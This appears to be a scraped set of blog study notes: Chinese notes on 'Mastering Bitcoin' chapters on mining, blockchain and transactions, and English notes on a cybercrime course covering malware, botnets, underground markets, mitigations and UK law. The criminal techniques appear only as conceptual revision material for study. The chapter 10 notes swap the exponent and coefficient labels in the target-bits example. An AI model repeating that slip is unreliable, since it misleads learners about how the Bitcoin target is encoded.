block来竞争下一个block，同时将新到来的block于本地的memory pool中的transaction进行比较，剔除那些已经被包含在block中的transaction The Coinbase Transaction\n我们在之前的章节中就介绍过，coinbase transaction就是一条特殊的transaction，由miner所创建，包含在新的candidate block当中，作为新的block挖掘的奖励，奖励的数值每四年减半，这些都需要miner自行计算并构造coinbase transaction 我们可以观察一下以下的transaction和之前我们在第六章中见过的有什么区别，主要是在inputs这一块，没有再指向一个特定的UTXO,而是一个coinbase 通过下图我们也可以比较普通的transaction与coinbase transaction的区别 之后是Transaction fee的计算，我们在第九章中提到过，transaction fee是unallocated value，只需要用inputs减去outpus即可 Total Transaction Fees = Sum(Inputs) - Sum(Outputs) 再加上coinbase transaction的值就可以得到总的reward。 Constructing the Block Header\n在开始mining工作之前，miner需要先构造好这样一个block header然后，填好出了Nonce之外的所有fields，最后的mining的目标就是找到一个特定的nonce，使构成的block hash小于target的值，一个mining node需要尝试十亿或者数万亿的nonce才能找到一个符合条件的。 关于target的介绍我们会放到后面，我们可以先将其当作是一个需要解决的puzzle,而mining的目的就是解决这个puzzle Mining the Block 简单来说，mining挖矿的过程就是不断的hash得到block header hash,只改变一个变量（Nonce），直到匹配到一个特定的target值 Proof-of-Work Algorithm 接下来，我们通过几个例子，来说明整一个POW algorithm. 想象小朋友们在玩一个游戏，用两个骰子，谁先掷出结果小于12的值就算获胜，这是不是非常简单，因为只要不是两个6，就能取胜。那么随着要求小于的数值变得越小，那么需要尝试的次数是不是自然就需要增多，当要求小于3才能获胜的时候，只有一种可能可以获胜，那么需要投掷的次数就达到了最高，概率学我已经忘的差不多了（大概的意思大家懂就好了，具体的数值我也不算出来搞笑了） 是不是有点类似我们的之前提到的挖矿的目标，就是通过不断的尝试来达到一个特定的符合要求的值。 再来看一个例子，假设我们需要一个nonce，加在\u0026quot;I am Satoshi Nakamoto\u0026quot;的后面，再利用SHA256 hash之后，得到的结果以0为开头，那么我们简单的以数字递增来类比掷骰子尝试，就会是这样： 我们通过观察可以发现，简单的一位数字的变化，可以让最后的hash值发生很大的变化，这也就是为什么我们频繁的看到hash再bitcoin的出现，因为任何长度的内容再经过了hash之后，都会生成每一位都完全随机，且简单的变化input会造成output的巨大变化的hash值，且没有办法找到一个特定的hash值的inputs，也没有办法找到另一个input与当前的input有相同的hash值。 那我们接着回到例子，观察hash的结果可以发现当nonce = 13的时候，hash的值第一位是0了，也就是hash值小于： 0x1000000000000000000000000000000000000000000000000000000000000000 最后，我们来说说具体的Proof of Work algorithm 是如何工作的 回忆一下block header中的fields，有target，有nonce，target就是骰子游戏获胜的要求，也是最后计算的结果，nonce，就是需要不断尝试的内容，而整一个block header就是上一个例子中和nonce加在一起hash的\u0026quot;I am Satoshi Nakamoto\u0026quot;，那么每一个block header 里面的内容都包含了很多特有的信息，也就意味着他们的hash都会非常的不同，也就保证了mining的工作只能不停的做尝试。 Target Representation 至此，我也就理解了target的结构的作用： Target由4个bytes组成，用来指代一个幂运算，第一个8位的byte，用来表示指数，后面三个bytes一共24位，用来表示一个系数，算出的结果，就是我们需要最后的block header hash需要小于的值。 比如block 277,316的target bits就是0x1903a30c，0x19 就是coefficient指数，0x03a30c就是exponent系数 Target的计算公式是： target = coefficient * 2^(8 * (exponent – 3)) target = 0x03a30c * 2^(0x08 * (0x19 - 0x03))^ =\u0026gt; target = 0x03a30c * 2^(0x08 * 0x16)^ =\u0026gt; target = 0x03a30c * 2^0xB0^ 十进制表达： =\u0026gt; target = 238,348 * 2^176^ =\u0026gt; target = 22,829,202,948,393,929,850,749,706,076,701,368,331,072,452,018,388,575,715,328 十六进制表达： =\u0026gt; target = 0x0000000000000003A30C00000000000000000000000000000000000000000000 那么调整难度的方法也很简单，就和掷骰子一样，下调target的大小即可，具体的做法就是增加开头的0就好了，高位的0越多，意味着结果越小，意味找到匹配hash值的概率越低，需要做的尝试就越大。一般来说，每多一位0，需要的时间就会翻倍（匹配的值的数量会减半） 当nonce计算完毕之后，其他full node只需要将block header hash与target一做比较就知道了。 Retargeting to Adjust Difficulty 那么整一个去中心化的网络要如何统一的调整难度呢？ 每一个node都会独立地，自动地调整难度，也就是target，每隔2,016个blocks，所有的block都会计算之前的2,016个blocks所需要mining的总时间，如果超出了每10min每个，就会降低难度，如果少于10min每个，就会增加难度： New Target = Old Target * (Actual Time of Last 2016 Blocks / 20160 minutes) Successfully Mining the Block 一次成功的挖矿过程应该就是Jing在其mining node上组装好了block header之后，将这个block header发送给所有的高性能机器去进行hash的尝试，直到试出了匹配target的nonce后，mining node就会将这个block转发出去，其他mining node在验证了这个block之后，就会放弃自己当前的candidate block并加Jing的block添加到本地的blockchain上，并将其block header hash作为新的candidate block的previous hash,这其实也是一种投票的代表，即表示认同Jing的block，并将自己的算力运用在Jing的block header hash上。 Validating a New Block 每一个bitcoin node都会通过一系列的标准验证新到来的block，只要有一个没有符合标准，那么整一个block就会作废，如果miner在一些内容上做了一些欺骗，比如把coinbase transaction 写的很大，然后再花大量的算力来完成proof-of-works algorithm，那么他们就会浪费所消耗的所有电费而做了一次无用功。这个检查将会包括block header的fields，也会包含一些例如大小的metadata，同时别忘了之前提到过的所有transaction的验证。 Assembling and Selecting Chains of Blocks Bitcoin 去中心化共识机制的最后一个步骤就是将验证好的block链接到blockchain上面去，大家注意到标题上有一个selecting chains的字眼，没错，最后一步还面临着chains的选择，这也意味着可以链接的chain不只一条，这与我们之后要讲到的 Fork 的有关。 每一个Nodes将维护三种区块 链接在主链上的区块 链接在主链分支上的区块 孤儿区块，也就是找不到父区块的区块 我们这里直接开始介绍Fork的概念，否则我觉得chain的变动的问题很难理解 Blockchain Forks Fork这个概念发生在两个mining node同时挖出了一个合法的block，那么他们在验证了proof-of-work algorithm的一瞬间就会将这个新的block传播出去，很显然离这两个mining node越近的node将会越早收到这个新的block，但是最终整个bitcoin network上的所有node，都会有两个新的block来指向上一个父区块 下图的结构就是每一个node连接在一起，形成整一个bitcoin network,同时圆圈中的星星就表示blockchain的末端，最新的一个block，在这个时候，所有的node中的blockchain都是一样的。 那么此时，Node X和Node Y同时计算出了新的block,我们用三角和倒三角表示，然后他们开始传递这个新的block，X 与 Y周围的node都会更优先收到他们的block 但是最终，他们的blockchain上前一个父区块上都会连着两个新的block，他们都可以算是合法的，那么一如既往，每一个mining node就会以其中一个block，正三角或者倒三角作为previous block hash 进行新的block的计算。 这时候，总有一个节点会算出新的一个block，根据其选中的previous block hash,这里也能更好的体现我们之前说的算力投票的问题，当有两个节点同时合法的时候，每一个mining node都会做出自己的选择来通过行动（hash计算）来支持其中的一个node。 当这个新的block产生的时候，进而扩散到整一个bitcoin network，那么每个node在验证过后就会根据previous block hash链接到其中一个竞争的block上，最终形成了一条更长的chain，同时也意味付出了更多的算力，我们称这条chain为main chain 主链。 那些“站错队”的mining node将会马上停止手中的工作，开始为新的主链进行计算，因为之后计算的block都会变成orphan孤儿区块 有了Fork的指示之后我们再来说主链，分支的概念就容易的多了 Main chain 主链，也就是拥有最长的，也就是付出了更多算力的链 main chain上可能也会有分支区块，这些分支将被保留下来，因为可能在将来用来取代现有的main chain Orphan block 孤儿区块，顾名思义，他们的各项标准都被验证会合法，可是previous block hash却找不到一个存在父区块可以匹配 这种区块可能会发生在前后两个block 的计算时间间隔很短，同时子区块的传播快于父区块，导致了子区块先达到却尴尬的发现没有父区块可以连接 那么这些区块就会被放在orphan block pool中等待可以链接的父区块的到来 Consensus Attacks Bitcoin在理论是是可以被攻击的，但需要注意的是，这也仅仅是针对未来的consensus共识，或者最近的几个block（最近的几十个），因为随着blockchain的变长，越早的block就越不容易被收到影响，就像我们之前举的地质层的例子一样。Consensus attacks只能影响最近的blocks以及造成针对未来blocks创建的DoS攻击。 其中一个场景就是\u0026quot;51% attack\u0026quot;，也就是当attackers能够控制超过半数的hashing power，就可以成功的攻击bitcoin，有三种攻击的手段 deliberate forks double-spend transactions DoS attacks 其实根据研究不需要51%的算力，只要能够控制超过1/3成功的概率就已经很高了 Fork/double-spend attack 主要目的是为了最近的block无效化，通过fork一个区块，然后通过掌握大量的算力，使main chain切换到新fork的区块链分支上来 这里要注意的是一个double-spend attack只能在attacker拥有目标transaction中的inputs的合法signature的情况下才能进行 我们通过一个具体的例子来说明一个double-spend attack是如何发生的 有一个Attacker Mallory想要从Carol的画廊中买一副价值很高的画作，他在付款之后，画廊在最新的一个block上确认了transaction，于是就把画交给了Mallory。但是于此同时，Mallory有一个帮手叫做Paul，他运营这一个mining pool，控制了相当大的算力，他直接重新mine/fork了相同高度的这个block，改写了transaction，将原本需要花费给画廊的UTXO转向了自己的钱包，并又算了一个block使当前的chain变得比原来的更长，成为了主链，这也就意味着原本的block失效了，transaction也就无效了，那么这个UTXO其实也就无法被消费了。因此，对于大数值的交易来说，最好可以采用第三方担保的手段来进行交易，并且等待6个以上的block都确认了这条transaction之后，才会比较稳妥。 当然，一旦有一方人员拥有这样庞大的算力，并开始破坏bitcoin的运行，那他们肯定不是冲着钱去的，或者说不是为了从bitcoin中直接获利的，因为一旦去中心化的共识安全机制被破坏，那么没有人会相信这个系统，价格也会崩溃。 Changing the Consensus Rules 在上面的章节中我们介绍了decentralised consensus mechanism的四个步骤，这是整一个bitcoin的基石，但是随着时代的变化，技术以及需求的改变，整一个bitcoin的系统也将不断更新和进步，但是去中心化系统以及机制的升级，将会被一般中心化开发管理的软件升级要难得多。 Forks这个概念我们在之前已经提到过了，一般会出现在两个竞争的block的出现中，让blockchain产生了分支。 我们接下来要介绍的两个概念 Hard Forks ，以及 Soft Forks 也是相同的结果，他们也会创造分支，但是意义不同，这是为了对Consensus rules进行改变 Hard Forks 我们通过一个具体的例子来介绍Hard forks是如何实现与运行的 下图展现的是一个blockchain，在Block4的位置出现了一个普通的fork，在竞争中4a获胜了，因为block5先被添加了，因此有4a的成为了主链 那么在Block6之后发生的就是 Hard Forks ，在Block6之后，一部分client进行了系统的升级，并采用了新的 consensus rule，假设新的规则改变了transaction中，用在unlocking script中的signature生成算法被改变了，当使用新的算法构建的transaction被广播出去之后，只有采用新规则的mining node能够验证并处理这条transaction，进而聚集到candidate block当中去。 那么对于那些没有升级的node，他们会直接拒绝这种transaction，因为在他们的核对机制当中，这条transaction是不合法的。他们会拒绝所有新规则下的transaction 以及block，新的block也会被他们视为orphan block，此后这两条分支将独立运行，互不兼容。 Soft Forks Soft forks准确来说并不是一个典型的fork，即其不会使blockchain产生分支。 Hard forks对于consensus rules的改变是与老版本的规则互不兼容的,可以说是有所创新，新老版本互相无法理解，而相反的，soft forks对于对老版本的consensus rules做出限制，即在原有的基础上进行限制与修改，其作用范围小于老版本的内容。因此新老版本仍然可以互相理解，transaction和block的验证与添加也可以继续进行。 ","date":"2022-05-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_10/","title":"Mastering Bitcoin 2nd Edition Chapter 10: Mining and Consensus"},{"content":"Mastering Bitcoin 2nd Edition Chapter 9: The Blockchain Introduction 在这一章中，我们将要介绍blockchain区块链的概念，区块链顾名思义，就是很多的block串联在一起，形成了一条长长的链子。 在实际情况中，blockchain使用了stack栈的结构，也就是第一个block，我们称为 genesis block 被放在栈底，然后随着新的block的产生，慢慢一个一个压入栈。 每一个block（出了genesis block）都有一个 parent block 也就是父区块，同时每一个block都有一个block header，和我们熟知的TCP header一样，里面可以有很多的fields，其中就有一个field叫做 previous block hash ，指示了其父区块的hash 这里我讲一下自己对hash的理解，就是本身每一个block header都会包含很多的信息，我们可以通过hash的方法将这些复杂的信息转化为一条唯一的哈希值，那么也就是说，一个block的block header中有其父区块的hash，那么当其再被hash保存的时候，就会收到父区块的hash的影响，也就是说，如果父区块的hash改变了，那么接下来一系列的子区块的hash都会随之发生改变。 这也就是为什么blockchain如此安全，因为如果你企图篡改一个block的内容，那么势必会引发整个一个blockchain的重新计算，而这样的计算是不可能完成的，越长的链越难实现，所以就像我们在之前的章节中提到的那样，到了6个以上的block我们就可以说是安全了。这就和地层一样，越在上面的地质层就越容易发生改变，收到季节气候的影响，而越埋在下面的地质层就越稳定，越不容易收到影响。 一个block会对应一个父区块，但一个block可以拥有很多的子区块，这就是我们说的Fork，这个概念我们会在后面一起学习到。 Block的结构 一个block的构成 block header transactions Block header previous block hash，用来指向父区块的hash a set of metadata: difficulty, timestamp, and nonce, 这些是在挖矿中产生的 metadata merkle tree root, 用来总结当前block的所有transaction Block identifiers 我们有两种办法来指代一个block： block hash，或者准确的来说是block header hash,因为是将block header用SHA256 hash两边的结果 这里细心的朋友可能会发现，在block的数据结构当中，并没有包含当前block hash的信息，因为其是由每一个收到当前block的node来计算，并保存在另外的数据库中的metadata block height, 第一个block的height就是0，后面就越来越高，当然这不是唯一的，之后我们在Fork中会讲到 Genesis Block Genesis block也就是所有block的祖先，其于2009年被Satoshi Nakamoto所创建，并附带有一条隐藏的信息， “The Times 03/Jan/2009 Chancellor on brink of second bailout for banks.” 通过引用了泰晤士报的标题来指示了其最早创建的时间，同时用以调侃全球正在经历的货币危机。 Genesis Block的hash值如下，我们可以在任意一个区块查询网站上找到它的信息 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f https://www.blockchain.com/btc/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f 区块链中链接新的区块 每一个Bitcoin full nodes都在本地保存了完整的区块链的副本，从genesis block开始到最新的区块，当收到新的区块的时候，每一个node就会验证这个block并添加到本地的blockchain上面去，验证的方法则是核对previous block hash的值是否为本地blockchain的最后一个区块的hash（有待考证，我觉得是不是太简单了一点，后期可能会修改，如果发现错误没有修改，请联系我修改） Merkle Trees 记得我们之前提到过每一个Block中都包含了所有的Transactions，但是很明显维护所有的这些transactions需要花费大量的内存空间，因此在这里我们就会采用Merkle Trees这个数据结构，顾名思义是一个Tree的结构，由root，nodes以及leaves组成，来简化对于transactions的维护 Merkle Trees的目的就是将所有的Transaction的hash（double-SHA256）作为树的leaves，并将每一对transaction的hash组合起来再进行hash，递归得不断hash，最终得到 merkle root 来表示所有的transaction的summary 举一个例子，当我们有A, B, C, D四个transactions，那他们的Hash就是，H_A, H_B, H_C and H_D，将他们两来那个配对再次Hash，最终得到Merkle Root（如何transaction的数量是单数，那么就重复最后一个leaves来实现平衡树） H_A = SHA256(SHA256(Transaction A)) H_AB = SHA256(SHA256(H_A + H_B)) 理解这个结构非常的简单，但是这里我们就要问一个问题，这有什么好处呢？ 首先因为是树的结构，因此在查询一个特定的节点就将算法的复杂度从N降低到了log(N)的水平 想象一个场景，首先我们有一个可靠的Merkle Root(如下图的结构),然后我们想要验证Transaction K在这个block当中，那么就可以只利用H_L, HIJ, H_MNOP, H_ABCDEFGH的信息，就可以和H_K一起算出最后的Merkle Root来核对是否正确。 这里我们就需要引出一个新的概念：Simplified Payment Verification (SPV) Simplified Payment Verification (SPV) 就像我们之前说的，Full node会记录并实时维护所有的transaction，但是SPV nodes作为一个轻量级的node，只需要记录和维护所有的block headers就够了，因为其中就有可靠的Merkle root信息，每当我们想要验证一个transaction是否存在的时候，SPV只需要向blockchain network请求对应的需要验证的hash值，就可以进行完成验证。 ","date":"2022-05-12T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_9/","title":"Mastering Bitcoin 2nd Edition Chapter 9: The Blockchain"},{"content":"Mastering Bitcoin 2nd Edition Chapter 2: How Bitcoin Works Bitcoin transactions Terms Transaction Move value from transaction inputs to transaction outputs 将多个 bitcoin value 转移给多个outputs地址 Input: reference to a previous transaction\u0026rsquo;s output, showing where the value is coming from Wallet里面的bitcoin都来自于之前的 transaction 的 output，使用的时候就是引用之前 outputs的地址 Output: directs a specific value to new owner\u0026rsquo;s bitcoin address, and can include a change output back to the original owner Bitcoin value发送到新的拥有者的地址，同时一部分找零回到原有者的地址 Transaction as double-entry bookkeeping Change 找零 与物理货币使用类似，当作为input的bitcoin value大于实际所需要的output的值，那么由于不能把一个bitcoin value拆开，因此output除了原来要求的值，还有一个新的bitcoin value返回给原有的账户，均使用新的地址 Transaction fee The slight difference between input and outputs It is collected by the miner as a fee for validating and including the transaction in a block to be recorded on the blockchain Transaction output 后会扣除一定的 transcation fee,用于作为miner验证和将transaction加入block的奖励 \u0026ldquo;Spending\u0026rdquo; sign a transaction that transfers value from a previous transaction over to a new owner identified by a bitcoin address 使用用户的 key 来确认一次transaction Transaction chains 所有当前拥有者所拥有的bitcoin value 均来自于上一次 transaction的 output，这些 bitcoin value将会作为下一次 transaction 的 input Transaction forms Most common transaction\n最普通的 transaction，input的value 大于output，因此一部分转交给新的owner，一部分找零返回原来的地址 Transaction aggregating funds\n当有很多“零钱”的时候，凑齐（aggregate）很多的inputs转交给新的owner Transaction distributing funds\n一份或多份inputs需要转交给多个owners，例如发工资(payroll) Constructing a Transaction Getting the Right Inputs: Most wallets keep track of all the available outputs belonging to addresses in the wallet Wallet application queries the bitcoin network to retrieve this information For example, use HTTP GET command to a specific URL to return all the unspent transaction outputs for an address Wallet application can construct transactions even if it is completely offline 关于Transaction的工作完全是由用户选择的wallet application来完成的，那么在获取正确的inputs的时候 如果用户选择的wallet是一个full node，那么wallet就会直接去查询bitcoin network 中的内容； 如果用户选择的是一个lightweight 的wallet，那么它只会追踪用户个人的unspent outputs 然后进行转账，这时候不需要网络也可以进行，就像在家里写了一张支票，可以稍后再交给银行一样，这里在本地离线写好了transaction的inputs和outputs，随后再交给bitcoin network 也可以 Creating outputs \u0026ldquo;A transaction output is created in the form of a script that creates an encumbrance on the value and can only be redeemed by the introduction of a solution to the script.\u0026rdquo; \u0026ldquo;Alice’s transaction output will contain a script that says something like, “This output is payable to whoever can present a signature from the key corresponding to Bob’s public address.” Because only Bob has the wallet with the keys corresponding to that address, only Bob’s wallet can present such a signature to redeem this output. Alice will therefore “encumber” the output value with a demand for a signature from Bob.\u0026rdquo; 创建outputs: Alice 创建一个脚本，这个脚本会实现：将一部分的inputs抵押在bitcoin network 上，随后等待Bob 来赎回。那么赎回就需要Bob 提供他对应的key来进行签名，只要签名正确就可以赎回这部分的 bitcoin value 同时transaction 会产生transaction fee 用来支付 miner 对transaction进行验证和记账的奖励，这个 trasaction fee 通常会在找零 change 里扣除 Bitcoin Mining 记账 转发交易：最终的目的是将每一次交易都记录在block chain 上面 所有参与到bitcoin network 中的终端都叫做bitcoin node 他们都通过bitcoin protocol 来进行交流 当Alice的wallet 将一个transaction 发送到另一个bitcoin node 的时候，每个节点都会验证这个transaction 是否属于自己，因为他们都可以用自己的key来验证，直到传递到Bob 当一个bitcoin node 收到了之前没有见过的transaction 的时候，他们就会做flooding 来确保大部分的节点都能收到这个transaction 这里有一个常见的误区就是，Bob 需要等待10min或者60min的时间，等待transaction被记账之后，才能完成咖啡的交付，实际上只需要几秒钟的时间，Bob 所拥有的 bitcoin node 就会得知有一个属于他的待赎回的outputs, 这已经是十分可靠的了 挖矿 矿工负担高性能的机器以及运行所需要的电费来进行挖矿，主要的工作是验证 Proof-of-Work “The algorithm for Proof-of-Work involves repeatedly hashing the header of the block and a random number with the SHA256 cryptographic algorithm until a solution matching a predetermined pattern emerges.” 矿工之前都可以互相合作，通过 mining pool 每次当bitcoin network 中有bitcoin node 提交一个新的transaction ，这些transaction就会被放到pool of unverified transactions 当中。 每个矿工开始挖矿的目的都是为了创造一个属于自己的block, 然后将这个block 添加到blockchain 上面去 因此他们会首先创建一个 candidate block, 然后开始验证所有当前存在于 pool of unverified 的 transactions, 同时他们会添加一条新的transaction which 指向他们的地址，这个transaction 所包含的bitcoin value 就是一个新的block 的奖励以及所有的transaction fee ，相当于是银行印了新的钱还有所有转账的手续费，当他们谁第一个完成了 proof of work algorithm的计算，就可以将他们所创造的 candidate block 添加到block chain 的末尾去成为新的block，其他人验证了其正确性之后，就会转而创建新的candidate block来计算新的block 一个很好的比喻就是proof of work 就是一个大型的数独游戏，通过增加行和列的大小可以很容易的增加难度，但是验证起来却十分容易 同时除了验证pool of unverified transactions 之外，还需要验证以前的transactions ，也就是说计算量会越来越大，之前的transaction 也会变得越来越可靠，一般认为存在于6个blocks的 transaction就已经是不可逆的了 ","date":"2022-05-11T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_2/","title":"Mastering Bitcoin 2nd Edition Chapter 2: How Bitcoin Works"},{"content":"CFC Week 3: Malware uses and monetisation Learning outcomes Explain the different monetisation strategies. Discuss the other ways malware is used, apart from monetisation. Explain how cybercrime is a commodity and how it is supported by an underground economy. What is the information-stealing malware? Information-stealing malware monitors its victims to collect usernames, passwords and financial information What is two-factor authentication? what you know (password) what you have (mobile phone for code) what you are (fingerprint, face, retina) What is man-in-the-browser attack? Man-in-the-browser attacks changes the browser window and makes users think that they are performing a legitimate transaction when they are sending money to the attacker instead. Describe operations of a mobile banking trojans What is Ransomware Cybercriminals encrypt user\u0026rsquo;s files and ask for a ransom to decrypt them again What is fake antivirus? lure user to pay the money and download fake antivirus. The fake antivirus doesn\u0026rsquo;t to anything, but perform malicious activities itself What is pay-per-installs scheme rent botnets for other cybercriminals for installing malware What is DDoS as a service Types use servers: higher bandwidth use infected computers: cheaper Services damage their competitor stress-testing services Mining bitcoin use infected computers to mine bitcoin, set up botnets Ways of using malware to make money Man-in-the-browser attacks Financial malware Ransomware Fake anti-virus DDoS as a service Mining bitcoin How underground communities avoid lemon market? self-policing scrutinise newly listed products and services interview people who want to join require recommendations from joined members to join escrow system payments first made to the administrator forwarded to seller after authenticity has been confirmed How cybercrime supported by an underground economy? CAPTCHA-solving service : automated software solver or human manually solve the CAPTCHAs Phone vertification abuse : - use Voice over IP (VoIP) numbers purchase SIM cards in developing countries (cheap) use SMS-vertification as a service Fake social media accounts : - automatically create accounts and followers Proxy : is a server that relays connections for a host, which hide the location and circumvent censorship Exploit kits : automate the exploitation of vulnerabilities Payment : - find banks willing to process criminal payment (high transaction fees) use cryptocurrency ","date":"2022-05-09T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_3_malware_uses_and_monetisation/","title":"CFC Week 3: Malware uses and monetisation"},{"content":"CFC Week 2: Advanced malware and worldwide SPAM Learning outcomes Describe how users get infected with malware. Describe how malware hides and how botnets function. Discuss the different ways criminals use malware. What is Infection vector? The method malware uses to propagate itself or infect a system or device List methods users get infected Social engineering : - Users are made to believe that they are installing a useful program instead of a malicious one Common vehicles are: Email attachments Software updates Scareware Drive-by-download : - A vulnerability on the user\u0026rsquo;s computer is exploited to have the computer automatically download and install malicious software Common processes: The user click on a link and is redirected to a malicious site Malware is downloaded to the user\u0026rsquo;s computer By exploiting a vulnerability, malware is executed and spread without the user\u0026rsquo;s interaction How mebroot malware works? Install in the Master Boot record, where executed before the operating system is loaded then the malware modifies the operating system when it is loaded, disable the antivirus What are differences between instruction reordering and instruction substitution? Instruction reordering : - the order of the instructions is changed output is the same signature is different Instruction substitution : - different instructions are used with produce the same result How modern antivirus software works against instruction reordering/substitution? looks for behaviours that are typical of malicious code What is polymorphic malware malware itself comes encrypted, each infection file looks different How malware authors prevent analysis in the first place? Malware developers try to detect whether their malware is being analysed and stop execution How botnets works? A number of computers compromised by an attacker bots connect to a botmaster to receive commands What is fast flux? Host C\u0026amp;C servers in static domain names, but frequently change the IP addresses behind What does domain generation algorithm(DGA) do? constantly change the domain names of C\u0026amp;C servers, DGA is used to map domain names to C\u0026amp;C servers What is remote access tools(RATs) usually used in commodity malware RAT operator interacts with the victim\u0026rsquo;s machine via a GUI capture audio and video from device logging keyboard inputs browse files on machine Three main challenges of criminals evolving in an arms race? Modern malware does not need user interaction to install Malware uses advanced techniques to avoid detection Botnets are constantly evolving their communication model to become more resilient Ways of monetising botnets include: Send email spam Post malicious content on social networks Perform advertisement fraud Encrypt victim data and ask for ransom Steal the victim\u0026rsquo;s financial information Differences between legitimate and malicious affiliate programmes they deal with products that are illegal they endorse criminal promotion techniques(botnets, black-hat SEO) What is blackhat search engine optimisation(SEO), and how it works? To attract victims, malicious websites are pushed high in search engine ranking for keywords that are unrelated to the website Find popular trends on Google Generate content related to the trends and link to the malicious site Upload the content on a forum, or on a compromised websites What are two tiers in spam operations Front-end Deals with sending spam emails: Email harvesters Botmasters Spammers Back-end Deals with converting spam traffic into money: affiliate programmes Actors in underground economy Botmasters infect computers, create botnets, and rent them Harvesters crawl the internet looking for valid email addresses Search engine optimisation(SEO) experts make sure that malicious sites are highly ranked on search engines Spam affiliate programs Set up sites selling goods - spammers can sign up to these programs and receive their cut ","date":"2022-05-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_2_advanced_malware_and_worldwide_spam_economy/","title":"CFC Week 2: Advanced malware and worldwide SPAM"},{"content":"CFC Week 4: Cybercrime mitigations Learning outcomes List and describe the various mitigation strategies. Understand that there is a constant arms race between criminals and investigators. List four mitigation strategies Engineering Securing computers and networks crippling botnet operations. Law Effectively prosecuting malware authors and their associates. Economics Making sure that cybercriminals don\u0026rsquo;t make money. Education Increasing user awareness of cybercrime threats. Two types of Intrusion detection system (IDS) Misuse-based IDS rely on models of malicious behaviour to identify matching entries in the event stream Anomaly-based IDS rely on models of normal behaviour to identify anomalous entries in the event stream List engineering mitigations techniques antivirus software intrusion detection patch vulnerabilities Blacklist mitigate blackhat search engine optimisation DNS sinkholing (ISPs can avoid directing their clients to domains that are known to be malicious) Dynamically allocating the resources (against DDoS) How to take down a botnet? seize active C\u0026amp;C servers (law enforcement/ ISPs) mitigate existing infections (DNS sinkholing) clean up infected computers (redirect the user and teach them how to) How to improve user awareness for reducing the rate of malware infections Educations on: Social engineering, how to avoid installing scareware Software updates, how to keep systems up to date to avoid driven-by download attacks Scams, how not to be money mule or reshipping mule scams Why arrest criminals is more effective Attackers could always set up a new operation Botnet is easy to set up Attackers learn from the takedown and make the operation more resilient Two reasons for taking down C\u0026amp;C servers: Because the act of misusing computers through malware is illegal Because the operations that the botnet carried out are illegal List economics mitigation strategies Raise domain cost to curb misuse ISPs need to keep good relations with each other Banks need to keep good relationships with other financial institutions which force rogue banks to stop doing business with cybercriminals ","date":"2022-05-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_4_cybercrime_mitigations/","title":"CFC Week 4: Cybercrime mitigations"},{"content":"CFC Week 5: Legal Framework Learning outcomes Briefly describe the legal aspects of cybersecurity. Summarise the main pieces of computer misuse legislation. Identify the different pieces of legislation governing intellectual property, copyright and data protection. Identify the three ACPO principles and explain their implications for computer forensics. 11. Describe the three main sections of the UK Computer Misuse Act 1990, as modified by the Police and Justice Act 2006. unauthorised access to computer material, punishable by 24 months\u0026rsquo; imprisonment and/or an unlimited fine updated (2006): punishable by up to 2 years in prison or a fine or both unauthorised access with intent to commit or facilitate commission of further offence(s), punishable by 24 months’ imprisonment and/or an unlimited fine on summary conviction and/or 5 years imprisonment and/or an unlimited fine on indictment; unauthorised modification of computer material, punishable by 24 months’ imprisonment and/or an unlimited fine on summary conviction and/or 10 years imprisonment and/or an unlimited fine on indictment; updated (2006) by unauthorised acts with intent to impair operation of computer, etc. punishable by up to 10 years in prison or a fine or both to cover Denial of Service (DoS) attacks. 12. Describe the main provisions of the Investigatory Powers Act 2017 and explain how the Act can benefit certain digital forensic investigations. Provides for UK intelligence agencies and UK law enforcement to carry out targeted interception of communications, bulk collection of communications data, and bulk interception of communications; permits access to CSP(communication service providers) and ISP(Internet Service Provider) logs, and right to demand decryption keys to encrypted data. How would law enforcement go about prosecuting terrorism in the UK and outside of the UK? Apply Mutual Legal Assistance Treaties applicable for specific country Two tiers of administrative fines that can be levied as penalties for non-compliance in General Data Protection Regulations (2018) Up to €10 million, or 2 per cent annual global turnover – whichever is higher. Up to €20 million, or 4 per cent annual global turnover – whichever is higher. What type of data and individual\u0026rsquo;s fundamental rights are protected under the GDPR(General Data Protection Regulation)? Type Data minimisation: only collect and use what is needed for the processing activity being undertaken Rights Retention: keep it only for as long as required Accountability: record keeping of data processing Security: protect data against breaches or unlawful processing of personal data Purpose limitation – data can only be used for the purpose it was collected for 10. Describe the four UK ACPO(Association of Chief Police Officers) principles on handling digital evidence, explaining the rationale underlying them. No action taken by law enforcement agencies or their agents should change data held on a computer or storage media which may subsequently be relied upon in court. In circumstances where a person finds it necessary to access original data held on a computer or on storage media, that person must be competent to do so and be able to give evidence explaining the relevance and the implications of their actions. An audit trail or other record of all processes applied to computer-based electronic evidence should be created and preserved. An independent third party should be able to examine those processes and achieve the same result. The person in charge of the investigation (the case officer) has overall responsibility for ensuring that the law and these principles are adhered to. Proportionality issues relating to seizure Does the item may hold evidence? Where the item is found? When the offfence was committed? Seize the items current in usage first. Every seizure of item should be reasonable Follow the Human Rights What should be prepared before attending a scene to capture digital evidence? Necessary equipment Consider potential sources of evidence: what, where? Consider seize cameras for taking digital photographs when evidence involve user-created digital images Take force\u0026rsquo;s speciallist advice in advance What should do when attending a scene? All actions should be recorded Avoid unwanted changes, be aware of volatile data, accessed by trained personnel, e.g. powered on/running systems Capturing online evidence Online evidence publicly available (e.g. forum postins, do not need to login), be aware of potential issues. private (login required) make records of all actions What could be included in source data Internet history records; E-mails; Instan Messaging logs; Media files (images and videos); Text Messages; Text documents; Spreadsheets; CCTV ","date":"2022-05-06T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_5_legal_framework/","title":"CFC Week 5: Legal Framework"},{"content":"CFC Week 9: Incident Management Learning outcomes Explain the Incident Management process. List the elements of the logging process. Describe the life cycle of events. What is the incident? is an unexpected event that disrupts the normal operation of a system What is the objective of the incident management process? is to return the service to normal operation as quickly as possbile after disruption What is the aim of incident management process? create as little negative impact as possbile on the business What are two modes of operations in incident management process? In practice : find a temporal workaround to ensure services are up and running In parallel : - investigate the incident identify the cause root find a permanent fix What are frameworks used to tackle incidents? ITIL Information technology infrastructure library uses a workflow for efficient resolution What are incident management workflow? Incident 